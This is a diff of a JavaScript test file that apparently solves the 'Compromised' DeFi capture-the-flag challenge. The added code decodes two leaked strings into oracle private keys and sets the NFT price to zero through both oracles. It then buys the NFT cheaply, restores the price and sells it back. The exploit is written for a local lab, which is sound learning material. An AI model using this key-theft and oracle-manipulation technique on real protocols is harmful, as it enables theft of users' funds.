@@ -53,7 +53,36 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const signer1 = new ethers.Wallet("4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535", ethers.provider);
+        /*
+         * The codebase in itself does not have vulnerabilities, but we are given 2 "leaked" strings that we assume contain private keys of the oracles.
+         * Once decoded, we can use them take control of the oracle and manipulate the price of the NFT.
+         */
+        const extractPrivateKey = (key) => {
+            const cleanedHexString = key.replaceAll(' ', '');
+            const byteArray = new Uint8Array(cleanedHexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            return Buffer.from(new TextDecoder("utf-8").decode(byteArray), "base64").toString();
+        }
+        const encodedKeys = [
+			'4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+			'4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
+		];
+        const oracle1 = new ethers.Wallet(extractPrivateKey(encodedKeys[0]), ethers.provider);
+        const oracle2 = new ethers.Wallet(extractPrivateKey(encodedKeys[1]), ethers.provider);
+
+        // We manipulate the price to zero
+        await oracle.connect(oracle1).postPrice('DVNFT', 0);
+        await oracle.connect(oracle2).postPrice('DVNFT', 0);
+
+        // We buy the NFT for free
+        await exchange.connect(player).buyOne({ value: 1 });
+
+        // We mset back the price to its initial value
+        await oracle.connect(oracle1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(oracle2).postPrice('DVNFT', INITIAL_NFT_PRICE);
+
+        // We sell back the NFT
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
